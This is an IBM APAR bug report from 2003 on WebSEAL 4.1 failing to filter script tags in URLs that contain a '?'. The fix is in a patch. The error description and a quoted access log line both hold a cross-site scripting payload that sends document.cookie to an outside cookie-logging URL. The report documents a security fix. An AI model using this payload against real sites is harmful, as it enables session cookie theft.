Title: IBM IY42077: AM4.1 cross site scripting failed When there is a "?" in the URI - United States

Text:
AIX SUBSCRIBE
You can track all active APARs for this component.



APAR STATUS
 * CLOSED AS PROGRAM ERROR.
    
   
   

ERROR DESCRIPTION
 *  When there is a "?" in the URI, WebSEAL does not
   filter the request, ie, still find <script> tag in web
   server access log.
   
   
   We tried to test the enhanced feature of AM 4.1 (URL string
   filtering)
   to
   no avail. The URL we tried was
   
   https://eastrnd.<customer [https://eastrnd.<customer]
   name>.com/stress/servlet/EastServlet?variable
     =<script>document.location
   ='http://www.cgisecurity.com/cgi-bin/cookie.cgi?%20'%20+document
   .cookie<
   /script>
   eastrnd.<customer name>.com is running WebSEAL version 4.1 and
   /stress is the
   junction.We expect that WebSEAL can filter all <script> tag (as
   mentioned in page 79 of WebSEAL admin guide by default).
   Unfortunately,
   We can still find <script> tag in web server access log
     10.152.102.245 - - [26/Feb/2003:17:11:00 +0800] "GET
     /servlet/EastServlet?variable=<script>document.location
   ='http://www.cgisecurity.com/cgi-bin/cookie.cgi?%20'%20+document
   .cookie<
   /script>
    HTTP/1.1" 200 373
   We have tried a few combinations in /opt/pdweb/etc/webseald.conf
   and the
   results were still the same.
   1.  without [illegal-url-substrings] stanza
   2.  add substring = <script under illegal-url-substrings] stanza
   
   The following is the output of WebSEAL (from view source)
   -----=====-----=====-----=====-----=====
   <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
   <!-- Copyright (C) 2000 Tivoli Systems, Inc. -->
   <!-- Copyright (C) 1999 IBM Corporation -->
   <!-- Copyright (C) 1998 Dascom, Inc. -->
   <!-- All Rights Reserved. -->
   <!--
        This is a WebSEAL error message template file.  It is used
        by the WebSEAL server to build a response when a particular
        error occurs.  This file can be modified as appropriate.
        Error details:
        * Code: 0x38cf0424
        * Text: Bad Request
   -->
   <html>
   <head>
   <meta http-equiv="Content-Type" content=" text/html;
   charset=iso-8859-1">
   <!-- Enter message title -->
   <title>Bad Request</title>
   </head>
   <body bgcolor="#FFFFFF">
   <img src="/pics/amlogo.gif"
        width=100%
        height="75"
        border="0"
        alt=" Access Manager for e-business Home">
   <!-- Enter message title -->
   <h1><font color="#FF0000">Bad Request</font></h1>
   <p><!-- Enter error description --> The Access Manager WebSEAL
   server
   received an invalid HTTP request.
   <br><br><br>
   <!-- Provide background explanation -->
   <h4>Explanation</h4>
   <p>Possible causes for this message include:
   <ul>
   <li>Incapatibility between the browser and the server.
   <li>A problem with the browser.
   
   
    
   
   

LOCAL FIX
 *  </ul>
   <br>
   <br>
   <br>
   <a href="/">[HOME BUTTON]</a></p>
   </body>
   </html>
   
   
   Michael T at Gold Coast reviewed the problem.
   LOCAL FIX:
   none
   
   
    
   
   

PROBLEM SUMMARY
 *  Fixed in patch 4.1-AWS-0004LA.
   
   
    
   
   

PROBLEM CONCLUSION
 *  Fixed in patch 4.1-AWS-0004LA.
   
   
    
   
   

TEMPORARY FIX

COMMENTS

APAR INFORMATION
 * APAR NUMBER
   IY42077
   
   
 * REPORTED COMPONENT NAME
   ACCESS MGR WEBS
   
   
 * REPORTED COMPONENT ID
   5724C0811
   
   
 * REPORTED RELEASE
   410
   
   
 * STATUS
   CLOSED PER
   
   
 * PE
   NoPE
   
   
 * HIPER
   NoHIPER
   
   
 * SPECIAL ATTENTION
   NoSpecatt
   
   
 * SUBMITTED DATE
   2003-03-18
   
   
 * CLOSED DATE
   2003-06-30
   
   
 * LAST MODIFIED DATE
   2010-10-13
   
   

 * APAR IS SYSROUTED FROM ONE OR MORE OF THE FOLLOWING:
   
   
   
 * APAR IS SYSROUTED TO ONE OR MORE OF THE FOLLOWING:
   
   
   

FIX INFORMATION
 * FIXED COMPONENT NAME
   ACCESS MGR WEBS
   
   
 * FIXED COMPONENT ID
   5724C0811
   
   

APPLICABLE COMPONENT LEVELS
 * R410 PSY
   UP